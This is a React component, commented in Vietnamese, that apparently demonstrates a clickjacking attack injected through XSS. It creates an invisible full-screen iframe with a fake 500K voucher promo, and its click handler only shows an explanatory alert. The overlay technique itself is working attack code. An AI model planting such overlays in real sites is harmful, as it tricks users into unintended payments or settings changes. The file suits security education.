// 🚨 COMPONENT MÃ ĐỘC - Đã bị inject vào website qua lỗ hổng XSS
// Đây là mô phỏng khi kẻ tấn công đã xâm nhập thành công vào frontend

import React, { useEffect, useState } from 'react';
import './InjectedClickjackAttack.css';

const InjectedClickjackAttack = ({ isActive = true, targetPage = '/checkout' }) => {
  const [overlay, setOverlay] = useState(null);

  useEffect(() => {
    if (!isActive) return;

    // 🎯 BƯỚC 1: Kẻ tấn công tạo iframe ẩn overlay lên trang thật
    const createMaliciousOverlay = () => {
      // Tạo container cho iframe overlay
      const overlayDiv = document.createElement('div');
      overlayDiv.id = 'malicious-clickjack-overlay';
      overlayDiv.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 999999;
        pointer-events: none;
      `;

      // Tạo iframe chứa trang lừa đảo
      const iframe = document.createElement('iframe');
      iframe.style.cssText = `
        width: 100%;
        height: 100%;
        border: none;
        opacity: 0;
        pointer-events: all;
      `;
      
      // Trang giả mạo - Ví dụ: giả mạo nút "Nhận voucher 500K"
      const maliciousHTML = `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body {
              margin: 0;
              padding: 0;
              background: transparent;
              font-family: Arial, sans-serif;
            }
            .fake-promo {
              position: absolute;
              top: 200px;
              left: 50%;
              transform: translateX(-50%);
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
              padding: 40px 60px;
              border-radius: 20px;
              text-align: center;
              box-shadow: 0 20px 60px rgba(0,0,0,0.3);
              cursor: pointer;
            }
            .fake-promo h1 {
              color: white;
              font-size: 32px;
              margin: 0 0 20px 0;
              text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            }
            .fake-promo p {
              color: #fff;
              font-size: 18px;
              margin: 0 0 30px 0;
            }
            .fake-btn {
              background: #FFD700;
              color: #333;
              border: none;
              padding: 20px 50px;
              font-size: 24px;
              font-weight: bold;
              border-radius: 50px;
              cursor: pointer;
              box-shadow: 0 8px 20px rgba(0,0,0,0.2);
              transition: all 0.3s;
              animation: pulse 2s infinite;
            }
            .fake-btn:hover {
              transform: scale(1.05);
              box-shadow: 0 12px 30px rgba(0,0,0,0.3);
            }
            @keyframes pulse {
              0%, 100% { transform: scale(1); }
              50% { transform: scale(1.05); }
            }
          </style>
        </head>
        <body>
          <div class="fake-promo" onclick="alert('🎯 BẠN VỪA CLICK VÀO TRANG GIẢ MẠO!\\n\\nTrên thực tế, click này có thể:\\n- Chuyển tiền từ tài khoản của bạn\\n- Xác nhận giao dịch nguy hiểm\\n- Đăng nội dung spam\\n- Thay đổi cài đặt bảo mật');">
            <h1>🎉 CHÚC MỪNG! 🎉</h1>
            <p>Bạn được tặng voucher giảm giá 500.000đ</p>
            <button class="fake-btn">NHẬN NGAY</button>
          </div>
        </body>
        </html>
      `;

      // Inject HTML vào iframe
      iframe.srcdoc = maliciousHTML;
      
      overlayDiv.appendChild(iframe);
      document.body.appendChild(overlayDiv);

      return overlayDiv;
    };

    // Delay một chút để trang load xong
    const timer = setTimeout(() => {
      const createdOverlay = createMaliciousOverlay();
      setOverlay(createdOverlay);
      
      // Log cảnh báo trong console
      console.warn('🚨 CẢNH BÁO: Website đã bị nhiễm mã độc Clickjacking!');
      console.warn('📍 Mã độc đã được inject vào component React');
      console.warn('🎯 Iframe overlay đã được tạo để lừa người dùng');
    }, 1000);

    // Cleanup khi component unmount
    return () => {
      clearTimeout(timer);
      if (overlay && overlay.parentNode) {
        overlay.parentNode.removeChild(overlay);
      }
    };
  }, [isActive, targetPage]);

  // Component này không render gì cả - nó chỉ inject mã độc vào DOM
  return null;
};

export default InjectedClickjackAttack;
